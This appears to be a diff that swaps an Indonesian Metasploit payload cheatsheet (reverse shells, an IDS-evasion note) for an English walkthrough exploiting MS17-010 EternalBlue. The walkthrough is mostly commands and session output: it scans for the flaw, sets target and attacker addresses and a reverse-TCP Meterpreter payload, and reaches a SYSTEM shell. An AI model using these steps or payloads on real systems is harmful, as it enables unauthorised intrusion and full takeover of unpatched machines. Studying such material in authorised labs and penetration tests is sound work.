@@ -1,36 +1,89 @@
----
+# Walkthrough: Exploiting MS17-010 (EternalBlue)
 
-#### `cheatsheets/payload_cheatsheet.md`
+This document describes the steps to exploit the SMBv1 vulnerability on Windows systems using the EternalBlue module in Metasploit.
 
-Cheatsheet payload dalam format Markdown yang mudah dibaca.
+**Target**: A Windows 7 / Windows Server 2008 R2 machine (without the MS17-010 security patch)
+**Objective**: To obtain a Meterpreter shell with SYSTEM privileges.
 
-# Metasploit Payload Cheatsheet
+-----
 
-Referensi cepat untuk payload yang umum digunakan.
+### Phase 1: Preparation and Scanning
 
-## Windows Payloads
+Ensure you are on the same network as the target. First, we will verify if the target is vulnerable using an auxiliary scanner module.
 
-| Jenis Payload | Contoh Path | Deskripsi |
-| :--- | :--- | :--- |
-| **Staged Meterpreter (TCP)** | `windows/meterpreter/reverse_tcp` | Payload kecil (stager) yang akan men-download sisa payload Meterpreter. Sangat umum digunakan. |
-| **Stageless Meterpreter (TCP)** | `windows/meterpreter_reverse_tcp` | Mengirim seluruh payload Meterpreter dalam satu koneksi. Ukuran lebih besar, tapi lebih stabil. |
-| **Staged Meterpreter (HTTPS)** | `windows/meterpreter/reverse_https` | Sama seperti reverse_tcp, tapi komunikasi dibungkus dalam SSL/TLS. Baik untuk menghindari deteksi IDS/IPS. |
-| **Stageless Shell (TCP)** | `windows/shell_reverse_tcp` | Memberikan command prompt (cmd.exe) biasa. Stageless. |
+1.  **Launch Metasploit**
 
-## Linux Payloads
+    ```bash
+    msfconsole
+    ```
 
-| Jenis Payload | Contoh Path | Deskripsi |
-| :--- | :--- | :--- |
-| **Staged Meterpreter (TCP, 64-bit)** | `linux/x64/meterpreter/reverse_tcp` | Meterpreter stager untuk sistem Linux 64-bit. |
-| **Stageless Meterpreter (TCP, 64-bit)** | `linux/x64/meterpreter_reverse_tcp` | Versi stageless dari payload di atas. |
-| **Stageless Shell (TCP, 64-bit)** | `linux/x64/shell_reverse_tcp` | Memberikan shell `/bin/bash` atau `/bin/sh` pada sistem 64-bit. |
-| **Python Shell (Generic)** | `python/meterpreter_reverse_http` | Payload berbasis Python, sangat berguna jika target memiliki Python terinstall. |
+2.  **Search for and Use the Scanner Module**
 
-## Web / Scripting Payloads
+    ```
+    msf6 > search ms17-010
+    msf6 > use auxiliary/scanner/smb/smb_ms17_010
+    ```
 
-| Jenis Payload | Contoh Path | Deskripsi |
-| :--- | :--- | :--- |
-| **PHP Meterpreter (Staged)** | `php/meterpreter/reverse_tcp` | Payload untuk dieksekusi di server web yang menjalankan PHP. |
-| **Java JSP Meterpreter (Staged)** | `java/jsp_shell_reverse_tcp` | Memberikan shell via halaman JSP yang di-upload ke server Java (Tomcat, dll). |
-| **NodeJS Shell (Stageless)** | `nodejs/shell_reverse_tcp` | Reverse shell untuk aplikasi berbasis NodeJS. |
+3.  **Set Options**
+    Replace `192.168.1.10` with your target's IP address.
 
+    ```
+    msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.10
+    msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+    ```
+
+4.  **Analyze the Results**
+    If the output indicates `Host is likely VULNERABLE to MS17-010`, you can proceed to the exploitation phase.
+
+### Phase 2: Exploitation
+
+Now we will use the exploit module to gain access.
+
+1.  **Use the Exploit Module**
+
+    ```
+    msf6 > use exploit/windows/smb/ms17_010_eternalblue
+    ```
+
+2.  **View the Required Options**
+
+    ```
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+    ```
+
+    We need to set `RHOSTS` and `LHOST`.
+
+3.  **Set the Exploit Options**
+
+      * `RHOSTS`: The IP address of the target machine.
+      * `LHOST`: The IP address of your machine (the attacking machine).
+      * `PAYLOAD`: We will use the 64-bit Meterpreter reverse TCP payload.
+
+    <!-- end list -->
+
+    ```
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.10.1
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    ```
+
+4.  **Run the Exploit**
+
+    ```
+    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
+    ```
+
+### Phase 3: Post-Exploitation
+
+If successful, you will see a `WIN` message and a Meterpreter session will open.
+
+[] Sending encoded stage (206403 bytes) to 192.168.1.10
+[] Meterpreter session 1 opened (10.10.10.1:4444 -\> 192.168.1.10:49157) at ...
+
+meterpreter \>
+
+You now have full control over the target machine. Verify your access rights:
+meterpreter \> getuid
+Server username: NT AUTHORITY\\SYSTEM
+
+**Walkthrough complete.**
